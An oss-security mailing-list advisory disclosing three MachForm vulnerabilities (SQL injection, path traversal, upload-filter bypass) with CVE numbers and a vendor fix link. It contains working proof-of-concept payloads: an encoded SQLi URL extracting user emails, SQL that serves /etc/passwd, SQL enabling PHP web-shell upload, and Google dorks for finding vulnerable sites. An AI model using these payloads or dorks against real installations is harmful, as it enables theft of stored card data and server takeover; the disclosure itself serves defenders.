X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4042" "Wednesday" "30" "May" "2018" "21:23:20" "+0200" "Amine Taouirsa" "taouirsa@gmail.com" "<CAOGhsh0gWVyfmXt1hUnxCC45KYRYAE0dfXu3xR_gufSJ3W8CHg@mail.gmail.com>" "116" "[oss-security] MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411" nil nil nil "5" "2018053019:23:20" "[oss-security] MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411" (number mark "U       taouirsa@gma May 30  116/4042  " thread-indent "\"[oss-security] MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 25717 invoked by uid 550); 30 May 2018 19:32:02 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17489 invoked from network); 30 May 2018 19:23:33 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=5JinmFSNQFhsBceXu1ixRS3I9i29qsfqRSsEk52cuFg=;
        b=HPwa3FITDCk9PfcI/K+zUJnj7vncFG7uguR6K/E8fvkj7Y2uug+u1l830rS5hAEP/P
         9ZAVhqpjjV3os8H/PsAWHYV72d2vi49xA4klBWbcG8K49oFNfXq4JTbw17uiuE4s8G89
         ggv0W2SaOI+SPN/5j42gSqBUQHmakhvvqUlwYQCfOZypGzC8az/z4QRYbYMXachGymBE
         9jY2xTH3rGqYV5xcb2Pm6TOwTnjHKKAPDVbnnRJUT421SbFqaOi6Uk7hB29Y54VslxNe
         Q/i15JvdkWcSCP5myxoxWPvXc+rGreuyyYKORP4ES2NlqzCsbzksSedCa0p1ulccyrHJ
         UPJQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=5JinmFSNQFhsBceXu1ixRS3I9i29qsfqRSsEk52cuFg=;
        b=nyptvGibQTLZ/WBCel3Igd58RPeVWdvZkEB+Dh6EorfRarBn84k5EY2zYJBx7HmlHk
         jpnIIGkvj8kLYdkFZxa4dX476RaV6O6xhszGzx1vOsx27XFJiEoPcA7r7jzvFPtlDnqO
         Lx1yYW7vyHitOCaeKdrL9l8Vn5nbcRwNQ/wBhRMP4FAdW0nR4rGb6s+7Bw4yS8qM+cu8
         7IVYW5cvRkx/z4WLZteKHbT8vzARcsYl5x2OTvXJxxqYfFMkrGW5rnFz1Y4adHI9/R6P
         MKF60VqJIn0LprdLGM/BbXPmTQaabHv5uBV857wpYpWPEj5jzzHTQrX1A+O3NLNSwQci
         ZO2A==
X-Gm-Message-State: APt69E3g+iH1fHsADxHKgSXu+oCpt95u/QudHo2a23wlMF0QiYfoe7zc
	m6n9e0KQErW5yWBpz2MwRyh5dhdOTKZZlCHbSg==
X-Google-Smtp-Source: ADUXVKKP+//9UGCx7ScaEkUIipKYn1ZbH8aLXVDrbAulsvRfqHMjZwraXWjiJo0Fmcd+xEMwB8KO5b7CxuhyGVoqRH0=
X-Received: by 2002:a0c:c342:: with SMTP id j2-v6mr3776598qvi.49.1527708201520;
 Wed, 30 May 2018 12:23:21 -0700 (PDT)
MIME-Version: 1.0
From: Amine Taouirsa <taouirsa@gmail.com>
Date: Wed, 30 May 2018 21:23:20 +0200
Message-ID: <CAOGhsh0gWVyfmXt1hUnxCC45KYRYAE0dfXu3xR_gufSJ3W8CHg@mail.gmail.com>
To: vuln@secunia.com, bugs@securitytracker.com, 
	submissions@packetstormsecurity.org, bugtraq@securityfocus.com, 
	oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000ac1260056d714806"
Subject: [oss-security] MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411

--000000000000ac1260056d714806
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

 Vendor: Appnitro
Product webpage: https://www.machform.com/
Full-Disclose: https://metalamin.github.io/MachForm-not-0-day-EN/
Fix: https://www.machform.com/blog-machform-423-security-release/

Author: Amine Taouirsa
Twitter: @metalamin

Google dork examples:
----------------------
"machform" inurl:"view.php"
"machform" inurl:"embed.php"

Summary:
---------
The form creation platform MachForm from Appnitro is subject to SQL
injections that lead to path traversal and arbitrary file upload.

The application is widely deployed and with some google dorks it=E2=80=99s =
possible
to find various webpages storing sensitive data as credit card numbers with
corresponding security codes. Also, the arbitrary file upload can let an
attacker get control of the server by uploading a WebShell.

[1] SQL injection (CVE-2018-6410):
-------------------------

[1.1] Description:
The software is subject to SQL injections in the =E2=80=98download.php=E2=
=80=99 file.

[1.2] Parameters and statement:
This SQLi can be found on the parameter =E2=80=98q=E2=80=99 which a base64 =
encoded value
for the following parameters:

  $form_id  =3D $params['form_id'];
  $id       =3D $params['id'];
  $field_name =3D $params['el'];
  $file_hash  =3D $params['hash'];


So the injectable parameters are =E2=80=98el=E2=80=99 and =E2=80=98form_id=
=E2=80=99 obtaining error-based,
stacked queries and time-based blind SQL injections. This is due to the
following vulnerable statement:

  $query  =3D "select {$field_name} from `".MF_TABLE_PREFIX."form_{$form_id=
}`
where id=3D?";


[1.3] POC
Proof of concept to get the first user mail:
  http:// [URL] / [Machform_folder] /download.php?q=3DZWw9IChTRUxFQ1
QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMDIwLChTRUxFQ1
QgTUlEKCh1c2VyX2VtYWlsKSwxLDUwKSBGUk9NIGFwX3VzZXJzIE9SREVSIE
JZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1IoUkFORCgwKSoyKS
l4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLkNIQVJBQ1RFUl9TRVRTIEdST1
VQIEJZIHgpYSkgOyZpZD0xJmhhc2g9MSZmb3JtX2lkPTE=3D

Which is the base64 encoding for:
  el=3D (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x2020,(SELECT
MID((user_email),1,50) FROM ap_users ORDER BY user_id LIMIT
0,1),0x2020,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP
BY x)a) ;&id=3D1&hash=3D1&form_id=3D1


[2] Path traversal (CVE-2018-6409):
-----------------------------------

[2.1] Descrition
download.php=E2=80=99 is used to serve stored files from the forms answers.
Modifying the name of the file to serve on the corresponding ap_form table
leads to a path traversal vulnerability.

[2.2] POC
First we need to change the name for the element on the form:
update ap_form_58009 set element_4=3D"../../../../../../.
./../../../../../../../../../etc/passwd" where id=3D1;

Now in order to be able to download it, we need to access:
  http:// [URL] / [Machform_folder] /download.php?q=3DZWw9NCZpZD0xJm
hhc2g9NDAyYmEwMjMwZDZmNDRhMmRlNTkwYWMxMTEwN2E0NTgmZm9ybV9pZD01ODAwOQo=3D

Which is the base64 encoding for;
  el=3D4&id=3D1&hash=3D402ba0230d6f44a2de590ac11107a458&form_id=3D58009

Note that hash is the MD5 of the corresponding filename:
  md5("../../../../../../../../../../../../../../../../etc/passwd") =3D
402ba0230d6f44a2de590ac11107a458

[3] Bypass file upload filter (CVE-2018-6411):
----------------------------------------------

When the form is set to filter a blacklist, it automatically add dangerous
extensions to the filters.
If the filter is set to a whitelist, the dangerous extensions can be
bypassed.

This can be done directly on the database via SQLi
update ap_form_elements set
element_file_type_list=3D"php",element_file_block_or_allow=3D"a"
where form_id=3D58009 and element_id=3D4;

Once uploaded the file can be found and executed in the following URL:
http:// [URL] / [Machform_folder] /data/form_58009/files/ [filename]

The filename can be found in the database
SELECT element_4 FROM ap_form_58009 WHERE id=3D1;

--000000000000ac1260056d714806--
